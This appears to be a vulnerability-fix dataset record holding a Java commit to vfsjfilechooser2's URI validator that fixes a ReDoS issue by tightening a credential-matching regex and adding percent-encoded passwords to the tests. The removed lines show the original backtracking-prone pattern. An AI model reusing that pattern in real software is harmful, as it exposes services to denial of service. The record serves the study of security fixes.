@@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"sftp:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"sftp:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1329,7 +1351,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"SFTP:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"SFTP:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1341,7 +1363,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"SFTP:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"SFTP:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1498,7 +1520,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"http:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"http:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1510,7 +1532,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"http:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"http:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1522,7 +1544,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"http: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"http: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1534,7 +1556,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"http:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"http:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1546,7 +1568,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"http:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"http:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1558,7 +1580,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"http:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"http:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1570,7 +1592,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"http:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"http:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1666,7 +1688,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTP:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"HTTP:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1678,7 +1700,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"HTTP:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"HTTP:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1690,7 +1712,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"HTTP: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"HTTP: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1702,7 +1724,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTP:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"HTTP:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1714,7 +1736,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTP:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"HTTP:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1726,7 +1748,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTP:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"HTTP:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1738,7 +1760,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTP:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"HTTP:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1835,7 +1857,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"https:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"https:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1847,7 +1869,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"https:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"https:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1859,7 +1881,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"https: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"https: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1871,7 +1893,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"https:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"https:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1883,7 +1905,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"https:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"https:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1895,7 +1917,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"https:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"https:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -1907,7 +1929,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"https:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"https:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2003,7 +2025,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTPS:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"HTTPS:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2015,7 +2037,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"HTTPS:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"HTTPS:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2027,7 +2049,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"HTTPS: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"HTTPS: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2039,7 +2061,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTPS:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"HTTPS:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2051,7 +2073,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTPS:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"HTTPS:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2063,7 +2085,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTPS:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"HTTPS:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2075,7 +2097,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"HTTPS:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"HTTPS:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2172,7 +2194,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"webdav:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"webdav:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2184,13 +2206,13 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"webdav:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"webdav:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n \\t\\t}\\n \\n-\\t\\ts = \"webdav: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"webdav: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2202,7 +2224,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"webdav:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"webdav:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2214,7 +2236,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"webdav:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"webdav:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2226,7 +2248,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"webdav:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"webdav:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2238,7 +2260,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"webdav:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"webdav:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2334,7 +2356,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"WEBDAV:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"WEBDAV:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2346,7 +2368,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"WEBDAV:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"WEBDAV:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2358,7 +2380,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"WEBDAV: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"WEBDAV: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2370,7 +2392,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"WEBDAV:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"WEBDAV:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2382,7 +2404,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"WEBDAV:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"WEBDAV:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2394,7 +2416,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"WEBDAV:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"WEBDAV:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2406,7 +2428,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"WEBDAV:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"WEBDAV:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2503,7 +2525,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"smb:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"smb:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2515,7 +2537,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"smb:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"smb:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2527,7 +2549,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"smb: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"smb: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2539,7 +2561,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"smb:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"smb:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2551,7 +2573,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"smb:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"smb:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2563,7 +2585,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"smb:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"smb:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2575,7 +2597,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"smb:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"smb:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2671,7 +2693,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"SMB:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"SMB:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2683,7 +2705,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"SMB:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"SMB:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2695,7 +2717,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"SMB: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"SMB: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2707,7 +2729,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"SMB:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"SMB:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2719,7 +2741,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"SMB:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"SMB:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2731,7 +2753,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"SMB:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"SMB:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2743,7 +2765,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"SMB:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"SMB:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);'}}",
            "message_norm":"incorporated yeting li's fix for potential regex denial of service (redos), see https:\/\/github.com\/fracpete\/vfsjfilechooser2\/issues\/7\npasswords can now also contain special characters (eg :), which have to be url encoded (ie %3a)",
            "language":"en",
            "entities":"[('denial of service', 'SECWORD', ''), ('redos', 'SECWORD', ''), ('https:\/\/github.com\/fracpete\/vfsjfilechooser2\/issues\/7', 'URL', ''), ('passwords', 'SECWORD', ''), ('encoded', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/main\/java\/com\/googlecode\/vfsjfilechooser2\/utils\/VFSURIValidator.java'])",
            "num_files":1.0,
            "patch_content":"From 9c9f2c317f3de5ece60a3ae28c371e9796e3909b Mon Sep 17 00:00:00 2001\nFrom: Peter Reutemann <fracpete@gmail.com>\nDate: Wed, 7 Oct 2020 10:18:37 +1300\nSubject: [PATCH] incorporated Yeting Li's fix for Potential Regex Denial of\n Service (ReDoS), see https:\/\/github.com\/fracpete\/vfsjfilechooser2\/issues\/7\n passwords can now also contain special characters (eg :), which have to be\n URL encoded (ie %3A)\n\n---\n ...\/utils\/VFSURIValidator.java                | 168 ++++++++++--------\n 1 file changed, 95 insertions(+), 73 deletions(-)\n\ndiff --git a\/src\/main\/java\/com\/googlecode\/vfsjfilechooser2\/utils\/VFSURIValidator.java b\/src\/main\/java\/com\/googlecode\/vfsjfilechooser2\/utils\/VFSURIValidator.java\nindex a635413..3e2aad5 100644\n--- a\/src\/main\/java\/com\/googlecode\/vfsjfilechooser2\/utils\/VFSURIValidator.java\n+++ b\/src\/main\/java\/com\/googlecode\/vfsjfilechooser2\/utils\/VFSURIValidator.java\n@@ -2,6 +2,8 @@\n  * VFS URIs validator\n  *\n  * Copyright (C) 2008 Stan Love\n+ * Copyright (C) 2020 University of Waikato, Hamilton, NZ\n+ * Copyright (C) 2020 Yeting Li\n  *\n  * Licensed under the Apache License, Version 2.0 (the \"License\");\n  * you may not use this file except in compliance with the License.\n@@ -233,11 +235,11 @@ else if ((drive != null) && (file == null)) {\n \t\t\/\/        \"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.*?:.*?@)*([^:]+)([ \t]*:[0-9]+)*([ \t]*:)*(\/.*)\");\n \t\t\/\/\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.+:.+@)*([^:]+)([ \t]*:[0-9]+)*([ \t]*:)*(\/.*)\");\n \t\tPattern p_ftp2 = Pattern\n-\t\t\t\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.+:.+@)*([^:]+?\/*)([ \t]*:[0-9]+)*([ \t]*:)*(\/.*)\");\n+\t\t\t\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/([^:@]+:[^:@]+@)*([^:]+?\/*)([ ]*:[0-9]+)*([ ]*:)*(\/.*)\");\n \t\tMatcher m_ftp2 = p_ftp2.matcher(_uri);\n \n \t\tPattern p_ftp3 = Pattern\n-\t\t\t\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/(.+:.+@)*([^:]+)([ \t]*:[0-9]+)*([ \t]*:)*(\/*?.*)\");\n+\t\t\t\t.compile(\"(ftp|FTP|sftp|SFTP|http|HTTP|https|HTTPS|webdav|WEBDAV|smb|SMB):\/\/([^:@]+:[^:@]+@)*([^:]+)([ \t]*:[0-9]+)*([ \t]*:)*(\/*?.*)\");\n \t\tMatcher m_ftp3 = p_ftp3.matcher(_uri);\n \n \t\tif (m_ftp2.matches()) {\n@@ -344,6 +346,26 @@ else if ((drive != null) && (file == null)) {\n \t\t\tif (local_pass.startsWith(\":\")) {\n \t\t\t\tlocal_pass = local_pass.substring(1);\n \t\t\t}\n+\t\t\t\/\/ decode specials chars (URL encoded %XY)\n+\t\t\tif (local_pass.contains(\"%\")) {\n+\t\t\t\tString tmp_local_pass = local_pass;\n+\t\t\t\tStringBuilder new_local_pass = new StringBuilder();\n+\t\t\t\twhile (tmp_local_pass.contains(\"%\")) {\n+\t\t\t\t\tnew_local_pass.append(tmp_local_pass.substring(0, tmp_local_pass.indexOf('%')));\n+\t\t\t\t\ttmp_local_pass = tmp_local_pass.substring(tmp_local_pass.indexOf('%'));\n+\t\t\t\t\tif (tmp_local_pass.length() >= 3) {\n+\t\t\t\t\t\tchar c = (char) Integer.parseInt(tmp_local_pass.substring(1, 3), 16);\n+\t\t\t\t\t\tnew_local_pass.append(c);\n+\t\t\t\t\t\ttmp_local_pass = tmp_local_pass.substring(3);\n+\t\t\t\t\t}\n+\t\t\t\t\telse 